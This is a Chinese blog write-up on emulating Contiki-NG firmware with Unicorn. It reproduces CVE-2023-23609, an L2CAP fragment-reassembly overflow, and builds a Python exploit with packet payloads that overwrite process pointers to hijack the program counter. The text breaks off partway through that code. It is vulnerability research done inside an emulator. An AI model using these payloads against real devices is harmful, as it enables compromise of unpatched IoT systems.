# Contiki Re-hosting 小记


本文记录如何用 Unicorn 模拟执行操作系统 Contiki-NG，并在上面复现并利用 CVE-2023-23609 的故事。

<!--more-->

## binary 分析

这个 [binary](../../../file/hello-world.elf) 是一个固件（OS），并不是以前分析的应用程序，所以需要改变视角，对代码中出现的操作系统层面的工作要敏感点。

#### ARM Cortex-M3 boot

既然它是一个操作系统，那么在 boot 的时候就必须遵守 ARM Cortex-M3 平台的规则。复习一下系统课中学到的 x86 操作系统的启动过程：按下电源，BOIS 把硬盘中的启动扇区搬到内存的 0xFFFFFFF0 （或是更耳熟的 0x7C00）处，开始从这个地址执行。

在 ARM Cortex-M3 中，中断向量表会被映射到 0 地址处，boot 代码做了这些事情：去 0 地址处检索这个表，将第一个表项的值赋给 sp，第二个表项（也就是 reset handler）的值赋给 ip。这样的目的是 reset handler 可以用 C 写，因为在 reset handler 时栈已经初始化好了。参见 [arm 官方 docs](https://developer.arm.com/documentation/ka001328/latest/) 与 [what-is-the-booting-process-for-arm](https://stackoverflow.com/questions/6139952/what-is-the-booting-process-for-arm)。


`_text` 起始处（0x00202000）就是中断向量表（中断向量表每个表项是什么，在平台上是有[规定](https://developer.arm.com/documentation/dui0552/a/the-cortex-m3-processor/exception-model/vector-table?lang=en)的），它的第一个表项是 `_end`，第二个表项是 `reset_handler`，印证了前面的说法。点开 `reset_handler` 发现它是这样的：

```c
void __noreturn reset_handler()
{
  int v0; // r0
  const char **v1; // r1
  const char **v2; // r2

  MEMORY[0x400D20B4] = 255;
  memcpy(&ble_l2cap_tx_process, 0x214920, 0x362u);  // data
  v0 = memset(&rt_ticks_epoch, 0, 0x29EC);          // bss
  main(v0, v1, v2);
}
```

首先疑似是将什么寄存器设置为 255. 然后一个 memcpy 一个 memset。仔细观察可以发现，`ble_l2cap_tx_process` 其实是 `.data` 的起始处，`rt_ticks_epoch` 是 `.bss` 的起始处。所以其实是从 flash（映射到地址空间 `0x214920`） 里把数据拷贝到 `.data` 段，并且把 `.bss` 段清零。

> mqa: 平时说的把代码烧进板子，其实是拷贝进 flash（外部存储器，类似于硬盘）。嵌入式系统比较神奇的一个点是，代码可以直接在 flash 里运行（可以想象成代码可以直接在硬盘里跑）。但是码能直接跑，数据段还是得放进内存里，所以需要把数据段从 flash 里拷贝进来。至于清零 .bss 段就更正常了，因为这就是操作系统该干的事儿，它不像 Linux 已经把页管理抽象好了，.bss 段分配出来就是零页。

真是豁然开朗，这样我们就走到了 main 函数。

#### main

接下来看看 main 里干了啥，首先就是一堆不明所以的硬件与软件初始化过程。

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  uip_ds6_addr_t *link_local; // r4
  int v4; // r4

  platform_init_stage_one();
  clock_init();
  rtimer_init();
  process_init();
  process_start(&etimer_process, 0);
  ctimer_init();
  watchdog_init();
  energest_init();
  stack_check_init();
  platform_init_stage_two();
  queuebuf_init();
  netstack_init();
  node_id_init();
  ...
}
```

没有太多说法，稍微说说知道的东西（主要是知道的东西也不多）。watchdog 是硬件。然后 `platform_init_stage_one` 点进去有一个 `soc_init`，自如其名就是 System of Chips 初始化。

```c
void soc_init()
{
  nvic_init();
  ioc_init();
  sys_ctrl_init();
  clock_init();
  lpm_init();
  rtimer_init();
  gpio_hal_init();
}
```

里面 `nvic_init` 是把中断向量表头赋值给一个 NVIC 寄存器（内存映射到了 0xE000ED08），具体是哪个寄存器都可以在 CorTex-M3 手册里查到。

```c
void nvic_init()
{
  MEMORY[0xE000ED08] = text;
}
```

ioc 不知道是什么的缩写，lpm 不知道是什么的缩写，gpio_hal 指的是 gpio 硬件抽象层（一般是不同硬件厂商造出来的一层抽象，使得上层接口一致，并无需关心下层硬件细节）。gpio 是什么不知道。

反正一系列初始化以后，固件打印出版本信息 `Starting Contiki-NG-release/v4.9-11-gfd7139694` 等。然后来分析一下它执行了哪些东西。

最开始的一个 `process_start` 启动的是 tcpip_process。后续 `autostart_start` 挨个儿启动的 `autostart_processes` 列表里的进程，实际上里面就一个 hello_world_process。这两个 process 都由一个结构体表示，成员变量里记录了 entry point，对应地址就是要执行的函数，具体如下，不明所以。

```c
unsigned __int8 __fastcall process_thread_hello_world_process(pt *process_pt, process_event_t ev, process_data_t data)
{
  if ( !process_pt->lc )
  {
    etimer_set(&timer_0, 0x500u);
    goto LABEL_6;
  }
  if ( process_pt->lc == 60 )
  {
    if ( !etimer_expired(&timer_0) )
      return 1;
    etimer_reset(&timer_0);
LABEL_6:
    puts("Hello, world");
    process_pt->lc = 60;
    return 1;
  }
  process_pt->lc = 0;
  return 3;
}

unsigned __int8 __fastcall process_thread_tcpip_process(pt *process_pt, process_event_t ev, process_data_t data)
{
  if ( !process_pt->lc )
  {
    tcpip_event = process_alloc_event();
    etimer_set(&periodic_0, 0x40u);
    uip_init();
    init_1();
    goto LABEL_4;
  }
  if ( process_pt->lc == 833 )
  {
    eventhandler(ev, data);
LABEL_4:
    process_pt->lc = 833;
    return 1;
  }
  process_pt->lc = 0;
  return 3;
}
```

启动完这两个 process 之后，一个 While 循环里开始 `process_run`。注意 start 和 run 的区别，start 可以认为只是把 process 结构、资源准备好，而 run 才是真正地运行（简单来说就是修改 process 状态，让它跑起来），所以既然它是一个操作系统，那么这个 `process_run` 里理应出现它的调度算法。果然：

```c
int process_run()
{
  if ( poll_requested )
    do_poll();
  do_event();
  return poll_requested + nevents;
}
```

`do_poll` 里去遍历 `process_list`，根据前面的猜测那么这个 process_list 理应是在前面启动的过程中构建的。所以就是不停地遍历所有 process，看看有没有哪个需要启动了。如果有，那就 `call_process`。`do_event` 里也是类似。

```c
void do_poll()
{
  process *i; // r4

  poll_requested = 0;
  for ( i = process_list; i; i = i->next )
  {
    if ( i->needspoll )
    {
      i->state = 1;
      i->needspoll = 0;
      call_process(i, 0x82u, 0);
    }
  }
}
```

总之是走到了 `call_process`，这里面一个大大地函数指针运行标志着我们分析的结束。

```c
void __fastcall call_process(process *p, process_event_t ev, process_data_t data)
{
  int v4; // r5
  unsigned __int8 (*thread)(pt *, process_event_t, process_data_t); // r3

  if ( (p->state & 1) != 0 )
  {
    v4 = ev;
    thread = p->thread;
    if ( thread )
    {
      process_current = p;
      p->state = 2;
      if ( (unsigned int)(((int (__fastcall *)(pt *, process_event_t, process_data_t))thread)(&p->pt, ev, data) - 2) <= 1
        || v4 == 131 )
      {
        exit_process(p, p);
      }
      else
      {
        p->state = 1;
      }
    }
  }
}
```

至此，我们发现这个 firmware 看上去就是不停地执行两个函数。当然如果查看所有调用了 `process_start` 的地方可以发现还会运行其他函数。

#### 一些题外话？

###### DMA

DMA 是硬件，会维护一个 dma buffer，是外设到内存的高速通道。一般 firmware 程序要使用外设数据，是从 MMIO 里拿来用。有了 DMA 以后不经过 MMIO，DMA 直接改变物理内存，将外设的数据写进内存，存在 dma buffer 中，而 firmware 程序只需要从这个 buffer 中拿就行了。这其中省略了 CPU 的各种映射、读写过程。

###### 中断

中断对于系统来说是非常重要的，一个支持中断的 CPU 会在每条执行结束之后，去看看中断硬件是否产生中断，如果产生了就去中断向量表里找对应中断函数地址。在执行中断函数之前，由**硬件**保存上下文（寄存器等）。执行完中断函数之后，由**硬件**恢复上下文，继续执行。

考虑这样一个需求，一个 firmware 想要处理接收到的网络包。能想到的做法是：firmware 把网络包的处理函数放在网卡的中断函数中。每当网卡接收到网络包时，它产生中断，并通过 DMA 或者 MMIO 方式将网络包内容发送给程序，CPU 捕获中断跑去执行中断函数，处理网络包，实现需求。这种响应式的处理方法无疑是中断机制下的产物，减少 CPU 空转。

这样很自然会想到这个问题，这个 Contiki 的 `process_thread_tcpip_process` 任务，看上去就是去响应、处理网络包。为啥它被放在 main 函数里一遍又一遍执行呢？这将随着本文不断深入地分析代码而揭开谜底。


## Re-host

理解够了接下来才真正开始干活儿，我们接下来的工作重心是用 Unicorn 把这个 firmware 跑起来。

#### 准备工作

###### extract raw binary

众所周知，一个 ELF 并不是任何段都是有用的。特别是在嵌入式的场景下，存储空间寸土寸金，把整个 ELF 全部烧进板子属实浪费。在这个场景下，感觉把 .text 和 .data 提出来就足够 Unicorn 去模拟了。

```
x1do0@ubt2022:~/firmware_fuzz/labs/day6$ arm-none-eabi-objcopy -O binary ./hello-world.elf hello-world.bin
x1do0@ubt2022:~/firmware_fuzz/labs/day6$ ls -la
total 812
drwxrwxr-x 2 x1do0 x1do0   4096 Sep 28 11:29 .
drwxrwxr-x 5 x1do0 x1do0   4096 Sep 26 18:47 ..
-rwxrwxr-x 1 x1do0 x1do0 516096 Sep 28 11:29 hello-world.bin
-rwxrwxr-x 1 x1do0 x1do0 730104 Sep 28 11:26 hello-world.elf
```

可以 xxd 对比看看提取出来的 binary 长什么样：开头就是 `.text` 段，而 `.data` 段被放在了 0x00012920 处。这里很自然会想到一个问题，这两个段的相对位置相对于 ELF 来说显然发生了改变。那么代码中访问 `.data` 时寻址岂不是失效了？前面提到 `.data` 是在 reset_handler 中拷贝的，而这里一个神奇的地方就在于，拷贝的地址 `0x214920` 与 `.text` 段（0x202000开始）之间正好差了 0x00012920，使得在模拟中只要正确定位了代码段，那么就不会出现任何问题。这到底是巧合还是必然？

```c
memcpy(&ble_l2cap_tx_process, 0x214920, 0x362u);
```



###### ARM Cortex-M3 memory layout

清清楚楚，明明白白：[memory map](https://documentation-service.arm.com/static/5ea823e69931941038df1b11?token=)

其中 Peripheral 区域就是 MMIO，一般来说我们只需要在 Unicorn 中 map 0 - 0x60000000 和 0xE0000000 以上的区域。

###### 如何模拟中断

Unicorn 是基于 QEMU 开发的，但前者将 QEMU 的中断支持完全去掉了，所以我们需要用软件来模拟中断响应的过程。简单来想，当代码模拟执行到要发生中断的位置处时，保存寄存器，跳到对应中断函数，执行完恢复寄存器，跳回中断发生处接着执行即可。

Unicorn 模拟中断的过程疑似是大有门道，但暂且先抱着能用就行的心态继续下去，不深入研究了。


###### 如何模拟硬件

一个固件上的硬件，比如传感器，收到了数据，它要从 MMIO 寄存器里读。如何模拟 MMIO 寄存器读呢？我们也简单地想，每当读某些地址时，主动 mem_write 一个随机值，模拟硬件数据就好了吧？

###### 如何跳过某些函数？

在 hook code 的时候发现，有些函数异常烦人，比如 `fade` 函数中的循环在被 hook 上之后使得整个模拟过程变得究极慢，而显然这并不是一个有什么作用的函数，所以得想个办法在模拟的时候直接将其跳过。

```c
void __fastcall fade(leds_mask_t l)
{
  int j; // r5
  int v3; // r4
  volatile int i; // [sp+4h] [bp-14h]
  volatile int ia; // [sp+4h] [bp-14h]

  for ( j = 0; j < 800; ++j )
  {
    if ( j > 400 )
      v3 = 800 - j;
    else
      v3 = j;
    leds_on(l);
    for ( i = 0; i < v3; ++i )
      ;
    leds_off(l);
    for ( ia = 0; 400 - v3 > ia; ++ia )
      ;
  }
}
```

其实思路也非常简单，在开始模拟之前把它 patch 掉让它提前返回就行了。观察函数体，进去的时候寄存器入栈，下拉 SP，出来的时候上拉 SP 并复原寄存器。

```
.text:00210924 ; void __fastcall fade(leds_mask_t l)
.text:00210924 fade                                    ; CODE XREF: platform_init_stage_two+3C↑p
.text:00210924                                         ; platform_init_stage_three+20↑p ...
.text:00210924
.text:00210924 i               = -0x14
.text:00210924
.text:00210924 l = R0                                  ; leds_mask_t
.text:00210924                 PUSH    {R4-R6,LR}
.text:00210926                 SUB     SP, SP, #8

...

.text:0021097C                 ADD     SP, SP, #8
.text:0021097E                 POP     {R4-R6,PC}
```

那么很自然的，我们把 0x210926 处的代码直接修改为 `POP {R4-R6,PC}` 即可。

```python
mu.mem_write(0x210926, b"\x70\xBD") # bypass fade, POP {R4-R6,PC}
```

解决不了问题，就消灭提出问题的人！

#### 模拟程序，并产生一个 reset 中断

我们先模拟执行到 0x210768 处。思路已经十分清晰了，直接上码。


```python
from unicorn import *
from unicorn.arm_const import *
from pwn import *
from scapy.all import *

import random

context.arch = 'arm'

REGION_START = 0
REGION_SIZE = 0x60000000
ROM_BASE = 0x202000

def hook_code(mu, address, size, user_data):        
    pass

interrupted = False

def hook_block(mu, address, access, user_data):
    global interrupted

    print(f"[hook block] 0x{address:x}, {access}, {user_data}")

    # interrupt 
    if (address == 0x203D5A and not interrupted):

        print("Interrupted...")
        sleep(3)
        interrupted = True

        # save registers
        ptrs = {}
        for reg in regs:
            ptrs[reg] = mu.reg_read(reg)
        pc = mu.reg_read(UC_ARM_REG_PC)
            
        # execute functions
        interrupt_no = 2 # reset
        interrupt_func = u32(mu.mem_read(ROM_BASE + 4 * (interrupt_no - 1), 4))
        mu.emu_start(interrupt_func, 0x00210768)

        exit()

        # restore
        for reg in regs:
            mu.reg_write(reg, ptrs[reg])    # how to deal with stack?
        mu.reg_write(UC_ARM_REG_PC, pc+2)


    pass
    

def hook_mem_unmapped(mu, access, address, length, value, user_data):
    print(f"[hook_mem_unmapped] {access}, {address:x}, {length}, {value}, {user_data}")
    pass


def hook_mem_read(mu, access, address, length, value, user_data):
    # print(f"[hook_mem_read] {access}, {address:x}, {length}, {value}, {user_data}")
    if length == 4:
        r = random.choice([0, 1, 0x4000000])   # to bypass sys_ctrl_init, random_init
        # print(f"content: {mu.mem_read(address, 4)}, ready to write random: {r}")
        mu.mem_write(address, p32(r))


regs = [UC_ARM_REG_SP, UC_ARM_REG_R0, UC_ARM_REG_R1, UC_ARM_REG_R2, UC_ARM_REG_R3, UC_ARM_REG_R12, UC_ARM_REG_LR]

def main():
    mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB)

    # memory regions
    mu.mem_map(REGION_START, REGION_SIZE)
    mu.mem_map(0xe0000000, 0x10000000) # NVIC

    # load ROM
    mu.mem_write(ROM_BASE, open('hello-world.bin', 'rb').read())

    # write memory / patch code
    mu.mem_write(0x210926, b"\x70\xBD") # bypass fade, POP {R4-R6,PC}
    # why not push pc, or mov pc,lr

    # init SP
    init_sp = u32(mu.mem_read(ROM_BASE, 4))
    reset = u32(mu.mem_read(ROM_BASE + 4, 4))
    mu.reg_write(UC_ARM_REG_SP, init_sp)
    
    # hooks
    mu.hook_add(UC_HOOK_CODE, hook_code)
    mu.hook_add(UC_HOOK_BLOCK, hook_block)
    mu.hook_add(UC_HOOK_MEM_UNMAPPED, hook_mem_unmapped)
    mu.hook_add(UC_HOOK_MEM_READ, hook_mem_read, None, 0x40000000, 0x60000000) # MMIO read

    print(f"reset:{reset:x}")

    mu.emu_start(reset, 0x00210768)

main()

```

做几点说明：

1. 前面提到 ARM Boot 的时候从 0 地址处读 SP 和 reset_handler，那是真正的硬件处理流程。软件模拟时，直接把 raw 加载到原本的地址处，至于 SP 和 reset_handler 直接从这个地址处读就行了。

2. hook_code 是比较好的调试手段，通过打印信息可以看到模拟过程。

3. 由于有一部分代码会循环等待硬件的值，所以要么把那部分代码 patch 掉，要么 hook_mem_read 来改变 MMIO（相当于从硬件输入值）。

4. 中断在 hook_block 中引入。由于模拟的是 reset，为了避免一直循环执行我们只引入一次中断。所以整个想要模拟的过程是这样的：boot -> reset_handler -> main -> 中断 -> reset_handler -> main -> 模拟结束 exit。可以利用 hook_code 打印地址信息看看模拟的是不是这个过程。


#### 触发更多中断，复现 CVE-2023-23609 

下面我们来做点更有意思的事情：模拟更多的中断来执行到 [CVE-2023-23609](https://github.com/contiki-ng/contiki-ng/security/advisories/GHSA-qr4q-6h3m-h3g7) 的漏洞代码，并构造中断数据复现漏洞。可以看到漏洞 patch 出现在 `input_l2cap_frame_flow_channel` 中，大概是缺少一个长度检测，导致紧接着的 memcpy 出现越界。查看 binary 中这个漏洞函数发现确实没有被 patch。

###### 如何走到漏洞函数

大概猜测这是一个网络包处理函数，所以我们得进一步分析网卡相关函数。中断表中的 `pka_isr` 和 `cc2538_rf_rx_tx_isr` 看上去相当相关。

`cc2538_rf_rx_tx_isr` 看上去是 poll 一个进程然后修改寄存器。这个进程的入口点在 `process_thread_cc2538_rf_process`，这个函数看上去就是个收包函数，接收到硬件传来的包以后，经过一系列的校验并调用 `input` 函数，而 `input` 就能触发漏洞函数。

```c
void cc2538_rf_rx_tx_isr()
{
  if ( !poll_mode )
    process_poll(&cc2538_rf_process);
  MEMORY[0x40088834] = 0;
}
```

好，所以接下来我们尝试触发中断函数 `cc2538_rf_rx_tx_isr`，中断号 158. 注入中断的代码基本可以照搬上部分，很显然中断恢复[细节](https://developer.arm.com/documentation/ddi0403/d/System-Level-Architecture/System-Level-Programmers--Model/ARMv7-M-exception-model/Exception-entry-behavior)很多，远远比这段代码简单，但是目前暂时能用就行。

```python
def hook_block(mu, address, access, user_data):
  global interrupted

  print(f"[hook block] 0x{address:x}, {access}, {user_data}")

  # interrupt 
  if (address == 0x203D5A and not interrupted):

      print("Interrupted...")
      sleep(3)
      # interrupted = True
      interrupted = True

      # save registers
      ptrs = {}
      for reg in regs:
          ptrs[reg] = mu.reg_read(reg)
      pc = mu.reg_read(UC_ARM_REG_PC)
          
      # execute functions
      interrupt_no = 158
      interrupt_func = u32(mu.mem_read(ROM_BASE + 4 * (interrupt_no - 1), 4))
      mu.emu_start(interrupt_func, 0x203B1C)

      # restore
      for reg in regs:
          mu.reg_write(reg, ptrs[reg])    # how to deal with stack?
      # mu.reg_write(UC_ARM_REG_PC, pc)

      print("ok")

      # mu.emu_start(0x203D5A, 0x00210768)

      exit()

  pass
```

然后发现就可以走到 `cc2538_rf_rx_tx_isr` 函数了，并触发了从 MMIO 读取网卡数据包的 `read` 函数。我们按照 MMIO pattern 就可以构造网络包了：先向 0x40088828 地址处塞 4 字节表示长度，然后每次向 0x40088828 地址处塞**一个**字节作为数据。这里也可以发现 `bufsize` 定死为 0x80，为我们后续的利用增添了不少麻烦。

```c
int __fastcall read(void *buf, unsigned __int16 bufsize)
{
  int result; // r0
  int i; // r3

  result = bufsize;
  if ( (unsigned int)MEMORY[0x40088828] <= bufsize )
    result = MEMORY[0x40088828];
  for ( i = 0; (unsigned __int16)i < (unsigned int)result; i = (unsigned __int8)(i + 1) )
    *((_BYTE *)buf + i) = MEMORY[0x40088828];
  return result;
}
```

好，我们修改一下 `hook_mem_read` 来模拟硬件行为，随便塞点什么到 MMIO。然后修改 `hook_code` 在 `input` 函数开始时验证一下数据有没有成功输入。结果显示成功了！


```python
data_ptr = 0
data_len = 0

def hook_code(mu, address, size, user_data):
    global data_len, data_ptr
    if (address == 0x202DBA):
        print("0x202DBA: get_channel_for_cid, l2cap_channel_count ", mu.reg_read(UC_ARM_REG_R0), u8(mu.mem_read(0x20002D76, 1)))
    elif (address == 0x202D9C):
        data_ptr = mu.reg_read(UC_ARM_REG_R0)
        print("0x202D9C: packetbuf_dataptr ", data_ptr)
    elif (address == 0x202DA2):
        data_len = mu.reg_read(UC_ARM_REG_R0)
        print("0x202DA2: packetbuf_datalen ", data_len)
        print("data: ", mu.mem_read(data_ptr, data_len))

packet_injected = 0

# memory pattern
# to inject a packget of p32(0x20) + 'a'*0x20
packet_body = [b'a' for _ in range(0x20)]
packet = [p32(0x20)] + packet_body

def hook_mem_read(mu, access, address, length, value, user_data):
    global packet_injected, packet
    print(f"[hook_mem_read] {access}, {address:x}, {length}, {value}, {user_data}")
    if length == 4:
        if address == 0x40088828 and packet_injected < len(packet):
            mu.mem_write(address, packet[packet_injected])
            packet_injected += 1
        else:
            r = random.choice([0, 1, 0x4000000])   # to bypass sys_ctrl_init, random_init
            # print(f"content: {mu.mem_read(address, 4)}, ready to write random: {r}")
            mu.mem_write(address, p32(r))
```

这样我们成功走到了漏洞函数，并且把 `packetbuf` 成功输入成了 0x20 个字符 a。


###### 如何触发漏洞

可以看到 `process_thread_cc2538_rf_process` 中会向 `packetbuf_dataptr` 处读最多 0x80 字节，而在 .bss 为其分配的空间就是 0x80，暂时也没什么发现什么问题。随着理解代码的深入，可以认为网络包一次只能收最多 0x80 字节，每一个网络包的数据都会被拷贝到 `packetbuf_dataptr` 中。

```c
unsigned __int8 __fastcall process_thread_cc2538_rf_process(pt *process_pt, process_event_t ev, process_data_t data)
{
  ...
  packetbuf_clear();
  v6 = packetbuf_dataptr();
  v7 = read(v6, 0x80u);
  if ( v7 > 0 )
  {
    packetbuf_set_datalen(v7);
    input();
  }
  ...
}
```

要触发漏洞，我们必须要弄清楚 channel 是干什么的，即如何让 `channel->rx_buffer.current_index` 超过 0x80 造成溢出。

```c
void __fastcall input_l2cap_frame_flow_channel(l2cap_channel_t *channel, uint8_t *data, uint16_t data_len)
{
  ...

  if ( channel->rx_buffer.sdu_length )
  {
    v4 = *(unsigned __int16 *)data;
    current_index = channel->rx_buffer.current_index;
    if ( (int)v4 > 1280 - current_index )
    {
      if ( curr_log_level_mac > 1 )
        goto LABEL_5;
      return;
    }
    memcpy(&channel->rx_buffer.sdu[current_index], data + 4, *(unsigned __int16 *)data);
    channel->rx_buffer.current_index += v4;
LABEL_10:                                      
    if ( channel->rx_buffer.sdu_length && channel->rx_buffer.sdu_length == channel->rx_buffer.current_index )
    {
      v6 = packetbuf_dataptr();
      memcpy(v6, &channel->rx_buffer, channel->rx_buffer.sdu_length); //vuln
      ...
    }
  }
}   
```

而这个 channel 是在 `input` 中通过 `get_channel_for_cid` 得到的，传给后者的参数显然可控。只需要让 `channel_for_cid` 不为零就能走到漏洞分支。

```c
void input()
{
  v0 = (uint8_t *)packetbuf_dataptr();
  v1 = packetbuf_datalen();
  v2 = (unsigned __int8)packetbuf_attr_0(0xBu);
  ...
  v3 = *((unsigned __int16 *)v0 + 1);
  channel_for_cid = get_channel_for_cid(*((_WORD *)v0 + 1));
  ...
  if ( v3 == 5 )
  {
    input_l2cap_frame_signal_channel(v0, v1);
    goto LABEL_12; // return
  }
  if ( channel_for_cid )
  {
    input_l2cap_frame_flow_channel(channel_for_cid, v0, v1);// vul
    ...
    goto LABEL_12; // return
  }

}
```

代码逻辑即将浮出水面，再来看 `get_channel_for_cid`，查看 l2cap_channel_count 的交叉引用发现在 `input_l2cap_conn_req` 中改变，而上个代码段中 `input_l2cap_frame_signal_channel` 恰好会调用此函数。

```c
l2cap_channel_t *__fastcall get_channel_for_cid(uint16_t own_cid)
{
  int v1; // r0

  v1 = (__int16)(own_cid - 0x41);
  if ( v1 < 0 )
    return 0;
  if ( v1 >= l2cap_channel_count )
    return 0;
  return &l2cap_channels[v1];
}
```

那么看上去我们得先进 `input_l2cap_frame_signal_channel` 来增加 channel

```c
void __fastcall input_l2cap_frame_signal_channel(uint8_t *data, uint8_t data_len)
{
  int v3; // r3

  v3 = data[4];
  switch ( v3 )
  {
    case 20:
      input_l2cap_conn_req(data + 5);
      break;
    ...
  }
}
```

增加完 channel 后我们就能成功进入漏洞函数 `input_l2cap_frame_flow_channel` 了。这个函数大概逻辑是：维护一个比 0x80 bytes 的更大（0x504 bytes）的缓冲区，如果网络包不分片（即只有一个网络包，其总大小域与当前片大小域相同），则把内容拷贝到缓冲区头部；如果网络包分片，则后续接收新的网络包会把内容不断接在后面，实现拼接；最终直到接收到的大小与第一个网络包总大小域的值相同，一次性地把这个大缓冲区的内容拷贝回 `packetbuf_dataptr`。而我们知道 `packetbuf_dataptr` 只有 0x80 bytes 大小，那么多构造几个分片包就能轻易实现溢出。

所以总的来说我们要这么做：

1. 触发 158 号中断，并精心构造网络包使其进入 `input` 的 `input_l2cap_frame_signal_channel` 分支。

2. 多次触发 158 号中断，并精心构造网络包使其进入 `input` 的 `input_l2cap_frame_flow_channel` 分支，最终触发越界拷贝。

要这么做就需要多次注入中断，不禁为前面使用的风雨飘摇破烂不堪的中断注入代码捏了把汗（但事实上好像没出太多问题）。由于 Unicorn 疑似不支持 WFI 指令，所以需要把 0x210768 处的代码 patch 掉，使其能模拟主函数中的循环。

> WFI 指令会将系统休眠，只有被中断才能唤醒后并继续执行，这样在实际环境中能大大减少能量消耗，并在一定程度上实现了响应式处理请求的场景，简直太智慧了。

###### 控制 PC

接下来我们来写 exp。仔细观察一下，溢出发生在 .bss 段，而理论上来说我们可以向后无限溢出。后方可以看到一个相当有前途的结构体指针 `notification_process_0`，它代表了一个进程，而这个进程会被 161 号中断函数 `pka_isr` 问询，并挂到最前方。如果我们将其修改指向一段可控的内存，那么我们就可以伪造进程的关键数据。如果修改入口点，那么当该进程被运行时便控制了 PC。

```c
void pka_isr()
{
  MEMORY[0xE000E290] = 0x10000;
  MEMORY[0xE000E190] = 0x10000;
  __dsb(0xFu);
  __isb(0xFu);
  if ( notification_process_0 )
  {
    process_poll((process *)notification_process_0);
    notification_process_0 = 0;
  }
}
```

但这个进程似乎从来没有启动过，被 poll 也不会运行。（注意，如前文所说，一个进程只有在被 start 之后才能被 run）。好消息是 `process_list` 也在溢出点后方，既然 `notification_process_0` 从来没有被挂上 `process_list`，那么我们就把它“手动”挂上去！

总结一下利用思路

1. 利用溢出篡改 `notification_process_0` 指针使其指向受控制的内存区域（比如前面提到的大缓冲区），伪造入口点为 0xbabecafe

2. 利用溢出篡改 `process_list` 列表头为 `notification_process_0`

3. 触发 161 号中断，它将把 `notification_process_0` 进程提到最前方。后续执行 `run_process` 时将遍历 `process_list` 列表，依次将需要 poll 的进程启动，如此便启动了 `notification_process_0` 进程，从入口点 0xbabecafe 处执行。

exp 如下

```python
from unicorn import *
from unicorn.arm_const import *
from pwn import *
from scapy.all import *

import random

context.arch = 'arm'

REGION_START = 0
REGION_SIZE = 0x60000000
ROM_BASE = 0x202000

regs = [UC_ARM_REG_SP, UC_ARM_REG_R0, UC_ARM_REG_R1, UC_ARM_REG_R2, UC_ARM_REG_R3, UC_ARM_REG_R12, UC_ARM_REG_LR]

data_ptr = 0
data_len = 0

emu_cnt = 0

def hook_code(mu, address, size, user_data):
    global data_len, data_ptr, emu_cnt
    # if (address < 0x0203D6E and address >= 0x203D5A):
    #     print(f"[hook code] 0x{address:x}, {size}, {user_data}")
    if (address == 0x202DBA):
        print("0x202DBA: get_channel_for_cid, l2cap_channel_count ", mu.reg_read(UC_ARM_REG_R0), u8(mu.mem_read(0x20002D76, 1)))
    elif (address == 0x202D9C):
        data_ptr = mu.reg_read(UC_ARM_REG_R0)
        print("0x202D9C: packetbuf_dataptr ", data_ptr)
    elif (address == 0x202DA2):
        data_len = mu.reg_read(UC_ARM_REG_R0)
        print("0x202DA2: packetbuf_datalen ", data_len)
        print("data: ", mu.mem_read(data_ptr, data_len))
            # sleep(3)
    elif (address == 0x202D3E):
        print("0x202D3E: r3, r4 ", mu.reg_read(UC_ARM_REG_R3), mu.reg_read(UC_ARM_REG_R4))
    elif (address == 0x202DB4):
        print("0x202DB4: r5 ", mu.reg_read(UC_ARM_REG_R5))
    elif (address == 0x202AF2):
        print("0x202AF2: len , data", mu.reg_read(UC_ARM_REG_R4), mu.reg_read(UC_ARM_REG_R0))
    elif (address == 0x20241E):
        print("0x202AF2: payload len ", mu.reg_read(UC_ARM_REG_R5))
    elif (address == 0x20247A):
        print("0x20247A: channel->rx_buffer.sdu_length ", hex(mu.reg_read(UC_ARM_REG_R3)))
    elif (address == 0x202482):
        print("0x202482: channel->rx_buffer.current_index ", hex(mu.reg_read(UC_ARM_REG_R2)))
    elif (address == 0x2052F0):
        print("0x2052F0: p->state - 1 ", hex(mu.reg_read(UC_ARM_REG_R3)))
    elif (address == 0x205412):
        print("0x205412: nevents ", hex(mu.reg_read(UC_ARM_REG_R2)))
    elif (address == 0x205498):
        r3 = mu.reg_read(UC_ARM_REG_R3)
        print("0x205498: poll_requested ", u8(mu.mem_read(r3, 1)))

    if (emu_cnt == 9 and address == 0x203D5A):
        print("stop")
        mu.emu_stop()
    pass

def hook_block(mu, address, access, user_data):
    global interrupted, emu_cnt

    print(f"[hook block] 0x{address:x}, {access}, {user_data}")

    # interrupt 
    if (address == 0x203D5A):
        emu_cnt += 1
        print("Interrupted...")
        # sleep(3)

        # save registers
        ptrs = {}
        for reg in regs:
            ptrs[reg] = mu.reg_read(reg)
        pc = mu.reg_read(UC_ARM_REG_PC)
            
        # execute functions
        if emu_cnt == 8:
            interrupt_no = 161
        else:
            interrupt_no = 158
        interrupt_func = u32(mu.mem_read(ROM_BASE + 4 * (interrupt_no - 1), 4))
        if emu_cnt == 8:
            mu.emu_start(interrupt_func, 0x20513C)
        else:
            mu.emu_start(interrupt_func, 0x203B1C)

        # restore
        for reg in regs:
            mu.reg_write(reg, ptrs[reg])    # how to deal with stack?
        # mu.reg_write(UC_ARM_REG_PC, pc)

        print("ok")

    pass
    

def hook_mem_unmapped(mu, access, address, length, value, user_data):
    print(f"[hook_mem_unmapped] {access}, {address:x}, {length}, {value}, {user_data}")
    if (address == 0xbabecafe):
        print("0xbabecafe Bingo!!")
    pass


packet_injected = 0
packet_body = b"\x00\x00\x05\x00\x14\x00\x0a\x00" + b'a'*0x20

channel_rx_buffer = 0x200008d4
pc_controlled = 0xbabecafe

packet_injected_2 = 0
packet_body_2 = (b"\x72\x00\x41\x00" + b"\xaa\x02") + p32(0) + p32(channel_rx_buffer) + p32(pc_controlled) + p16(0) + b'\x01' + b'\x00'+ b"eaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfa"


# override notification_process
packet_injected_3 = 0
packet_body_3 = (b"\x72\x00\x41\x00" + b"\xaa\x02") + b"aa" + p32(0) + p32(channel_rx_buffer) + p32(pc_controlled) + p16(0) + b'\x01' + b'\x00' + b"aafaaagaaahaaaiaaaja" + p32(channel_rx_buffer) + p32(channel_rx_buffer) + b"aanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfa"

# override process_list
packet_injected_4_n = [0 for _ in range(4)]
